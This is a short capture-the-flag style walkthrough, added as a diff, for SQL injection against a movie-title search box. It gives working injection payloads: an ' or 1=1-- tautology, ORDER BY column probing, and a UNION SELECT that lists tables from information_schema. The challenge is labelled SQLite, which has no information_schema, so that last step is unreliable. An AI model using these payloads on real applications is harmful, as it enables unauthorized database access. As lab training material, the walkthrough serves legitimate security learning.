@@ -1,0 +1,17 @@
+                         SQLINjection (SQLITE)
+
+    *As you can see the challenge allow user to search for movies titles .
+
+    *Let's try simple payload in the input text box =====> 'or 1=1-- .
+
+    *AS you see it worked then let's try =======> 'order by 7--  "just to know how many columns existedin the table" .
+
+    *As it was wrong let's try 'order by 6-- .
+
+    * It worked now ypu can go and us the payloade ======> ' union all select 1,table_schema,table_name,4,5,6 from information_schema.tables where 1=0 or 1=1-- .
+
+    *Now you can Explore it with other payload .
+
+
+
+
